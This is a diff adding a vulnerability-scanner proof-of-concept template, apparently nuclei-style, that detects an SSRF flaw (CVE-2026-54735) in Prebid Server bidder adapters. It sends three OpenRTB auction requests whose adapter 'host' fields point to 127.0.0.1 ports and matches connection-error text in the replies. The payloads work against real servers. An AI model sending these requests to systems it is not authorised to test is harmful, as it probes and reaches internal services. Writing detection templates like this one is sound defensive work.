@@ -1,0 +1,102 @@
+[info]
+author = "ave"
+description = "检测 Prebid Server 竞价适配器（bidder adapters）中因未校验用户提供的 host/subdomain 参数导致的 SSRF 漏洞。通过向 /openrtb2/auction 发送包含恶意 ext 字段的 OpenRTB 竞价请求，诱使服务器向内部地址（127.0.0.1）发起出站连接，根据响应中的连接错误信息判断漏洞是否存在。"
+id = "POC-AVE-2026-0797"
+name = "CVE-2026-54735 Prebid Server SSRF PoC"
+severity = "critical"
+tags = [
+    "cve-2026-54735",
+    "ssrf",
+    "prebid",
+]
+vuln_id = [
+    "CVE-2026-54735",
+    "AVE-2026-0797",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/openrtb2/auction"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"id":"ssrf-probe-1","imp":[{"id":"imp-001","banner":{"format":[{"w":300,"h":250}],"w":300,"h":250},"ext":{"emtv":{"host":"127.0.0.1:80","publisherId":"12345"}}}],"site":{"page":"https://example.com/","domain":"example.com","publisher":{"id":"99999"}},"user":{"id":"test-user-probe"},"at":1,"tmax":10000}'
+type = "json"
+
+[poc.requests.headers]
+Accept = "application/json"
+Content-Type = "application/json"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "connection refused",
+    "no route to host",
+    "ECONNREFUSED",
+    "EHOSTUNREACH",
+    "dial tcp",
+    "i/o timeout",
+    "connection timed out",
+]
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/openrtb2/auction"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"id":"ssrf-probe-2","imp":[{"id":"imp-001","banner":{"format":[{"w":300,"h":250}],"w":300,"h":250},"ext":{"ownadx":{"host":"127.0.0.1:8080","tokenId":"testtoken","ssId":"testss","pubId":"12345"}}}],"site":{"page":"https://example.com/","domain":"example.com","publisher":{"id":"99999"}},"user":{"id":"test-user-probe"},"at":1,"tmax":10000}'
+type = "json"
+
+[poc.requests.headers]
+Accept = "application/json"
+Content-Type = "application/json"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "connection refused",
+    "no route to host",
+    "ECONNREFUSED",
+    "EHOSTUNREACH",
+    "dial tcp",
+    "i/o timeout",
+    "connection timed out",
+]
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/openrtb2/auction"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"id":"ssrf-probe-3","imp":[{"id":"imp-001","banner":{"format":[{"w":300,"h":250}],"w":300,"h":250},"ext":{"iionads":{"host":"127.0.0.1:9000","accountId":"12345"}}}],"site":{"page":"https://example.com/","domain":"example.com","publisher":{"id":"99999"}},"user":{"id":"test-user-probe"},"at":1,"tmax":10000}'
+type = "json"
+
+[poc.requests.headers]
+Accept = "application/json"
+Content-Type = "application/json"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "connection refused",
+    "no route to host",
+    "ECONNREFUSED",
+    "EHOSTUNREACH",
+    "dial tcp",
+    "i/o timeout",
+    "connection timed out",
+]
